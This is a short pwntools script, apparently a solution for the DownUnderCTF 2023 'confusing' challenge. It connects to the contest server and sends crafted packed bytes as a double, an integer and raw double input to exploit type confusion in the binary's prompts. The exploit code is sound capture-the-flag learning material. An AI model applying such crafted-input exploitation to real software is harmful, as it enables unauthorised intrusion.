from pwn import *

elf = ELF('../dist/confusing')
host = '2023.ductf.dev'
port = 30024
io = remote(host, port)
#io = process(elf.path)
#context.binary = elf

io.sendlineafter(b'Give me d: ', str(struct.unpack('d', p16(13337) + b'\xff\xff\xff\xff\xff\xfe')[0]).encode())
io.sendlineafter(b"Give me s: ", str(u32(b'FLAG')).encode())
io.sendlineafter(b"Give me f: ", struct.pack('d', 1.6180339887))

io.interactive()
